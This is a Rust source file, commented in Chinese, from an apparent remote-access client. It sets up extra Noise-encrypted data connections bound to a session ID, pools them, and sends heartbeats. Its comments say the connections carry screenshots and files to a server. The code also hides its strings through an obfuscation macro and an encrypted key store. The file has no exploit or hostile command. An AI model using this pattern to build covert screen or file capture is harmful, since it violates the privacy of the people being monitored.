//! KikData 连接的 Noise 握手、Kik 绑定、数据读循环和心跳。
//!
//! 每条数据连接独立加密并拥有随机连接 ID，但都绑定当前主连接取得的同一 Kik ID。认证成功后加入连接池，
//! 文件帧可在多条连接间轮询发送；单条断线只降低吞吐，不立即结束主连接。

use crate::context::Context;
use crate::read_handle;
use anyhow::Error;
use bytes::BytesMut;
use common::channel::{Channel, ChannelType};
use common::config::Config;
use common::hidden;
use common::ltc_codec::{
    LengthFieldBasedFrameDecoder, DATA_MAX_FRAME_LENGTH, INIT_MAX_FRAME_LENGTH,
};
use common::message::init_frame::InitFrame;
use common::noise_transport::connect_kik_noise;
use common::protocol;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::BufReader;
use tokio::sync::mpsc::Sender;
use tokio::sync::{mpsc, Mutex};
use tokio::task::JoinHandle;
use tokio::time;
use tokio::time::timeout;
use tokio_stream::StreamExt;
use tokio_util::codec::FramedRead;
use uuid::Uuid;

/// 建立一条 KikData 连接，等待服务端确认后加入当前 Kik 的连接池。
pub async fn kik_data_conn(context: Context, config: &Config) -> anyhow::Result<JoinHandle<()>> {
    let transport = connect_kik_noise(
        &config.server_host,
        &config.server_port,
        config.read_timeout,
        &common::generated::encrypted_strings::KIK_NOISE_SERVER_PUBLIC_KEY(),
    )
    .await?;
    // Kik 数据通道承载截图和文件内容，帧上限与当前 4 MiB 分片协议保持独立余量。
    let framed_read = FramedRead::new(
        BufReader::new(transport.reader),
        LengthFieldBasedFrameDecoder::new_with_max_frame_len(INIT_MAX_FRAME_LENGTH),
    );
    let framed_arc = Arc::new(Mutex::new(framed_read));

    let channel_arc = Arc::new(Mutex::new(Channel::new(
        transport.writer,
        None,
        ChannelType::Unknown,
        transport.local_addr,
        transport.peer_addr,
    )));
    channel_arc
        .lock()
        .await
        .set_write_timeout(config.write_timeout);

    // 发送 KikData 绑定请求；收到确认前保持 Unknown 和握手帧上限。
    let channel = channel_arc.clone();
    handle_active(&context, channel.clone()).await?;

    // 初始化通道只传一次服务端确认，用于阻止未认证连接提前进入数据池。
    let (mut tx, mut rx) = mpsc::channel::<String>(1);

    let context_clone = context.clone();
    let read_timeout = config.read_timeout;
    let handle = tokio::spawn(async move {
        let context = context_clone;
        // 每条数据连接都有独立心跳，坏连接会单独从池中移除。
        let chan = channel.clone();
        tokio::spawn(async move {
            hearbeat(chan).await;
        });

        let e = loop {
            // 读锁只包住 next().await，避免 match 臂内处理逻辑被临时锁生命周期拖住。
            let read_result = {
                let mut framed = framed_arc.lock().await;
                timeout(read_timeout, framed.next()).await
            };

            match read_result {
                // 外层 timeout 同时约束静默对端和慢速帧攻击。
                Ok(res) => {
                    match res {
                        Some(Ok(msg)) => {
                            // 数据解析后按 data ID 投递，不在此处执行文件写入。
                            let channel = channel.clone();
                            if let Err(error) =
                                handle_read(&context, channel.clone(), msg, &mut tx).await
                            {
                                break Some(error);
                            }
                            if channel.lock().await.channel_type == ChannelType::KikData {
                                framed_arc
                                    .lock()
                                    .await
                                    .decoder_mut()
                                    .set_max_frame_len(DATA_MAX_FRAME_LENGTH);
                            }
                            continue;
                        }
                        Some(Err(e)) => {
                            dev_debug!("连接异常:{}", e);
                            break Some(anyhow::Error::new(e));
                        }
                        // 对端正常关闭也进入统一 inactive 清理。
                        None => {
                            //不在这里对正常关闭进行特殊处理
                            break None;
                        }
                    }
                }
                Err(e) => {
                    dev_debug!("超时未读断开");
                    let _ = channel.clone().lock().await.write_half_close().await;
                    break Some(anyhow::Error::new(e));
                }
            };
        };

        if let Some(error) = e {
            let chan = channel.clone();
            handle_error(chan, error).await;
        }

        handle_inactive(&context, channel).await;
    });

    // 等待唯一初始化确认；成功后才分配本地连接 ID 并加入轮询池。
    match timeout(config.read_timeout, rx.recv())
        .await
        .map_err(|_| anyhow::Error::msg(hidden!("等待数据连接初始化响应超时")))?
    {
        None => {
            return Err(anyhow::Error::msg(hidden!("发送端关闭，连接结束")));
        }
        Some(_kik_id) => {
            {
                let mut guard = channel_arc.lock().await;
                guard.set_id(Uuid::new_v4().to_string());
                guard.channel_type = ChannelType::KikData;
            }
            context.insert_data_conn(channel_arc.clone()).await?;
        }
    };
    Ok(handle)
}

async fn hearbeat(channel: Arc<Mutex<Channel>>) {
    loop {
        time::sleep(Duration::from_secs(5)).await;
        let arc = channel.clone();
        if arc.lock().await.is_closed() {
            return;
        }

        let mut guard = arc.lock().await;
        if guard.channel_type != ChannelType::Unknown {
            match guard.write_and_flush(&protocol::kik_pong()).await {
                Ok(_) => {}
                Err(_) => {
                    break;
                }
            };
        }
    }
}

async fn handle_active(context: &Context, channel: Arc<Mutex<Channel>>) -> anyhow::Result<()> {
    let id = context
        .id
        .lock()
        .await
        .clone()
        .ok_or_else(|| anyhow::Error::msg(hidden!("命令连接尚未取得 kik id")))?;
    channel
        .clone()
        .lock()
        .await
        .write_and_flush(&protocol::transfer_encode_frame(InitFrame::KikDataConnReq(
            id,
        )))
        .await
}

async fn handle_inactive(context: &Context, c: Arc<Mutex<Channel>>) {
    c.clone().lock().await.try_write_half_close().await;
    context.delete_data_conn(c).await;
}

async fn handle_error(_channel: Arc<Mutex<Channel>>, _error: Error) {
    dev_debug!("handle_error:{}", _error);
}

async fn handle_read(
    context: &Context,
    channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
    auth_tx: &mut Sender<String>,
) -> anyhow::Result<()> {
    let channel_type = channel.lock().await.channel_type;
    match channel_type {
        ChannelType::KikData => read_handle::handle_kik_data(context, channel, msg).await,
        ChannelType::Unknown => {
            read_handle::handle_init_message(context, channel.clone(), msg, auth_tx).await?;
            channel.lock().await.channel_type = ChannelType::KikData;
            Ok(())
        }
        _ => Err(anyhow::Error::msg(hidden!("数据连接状态与帧类型不匹配"))),
    }
}
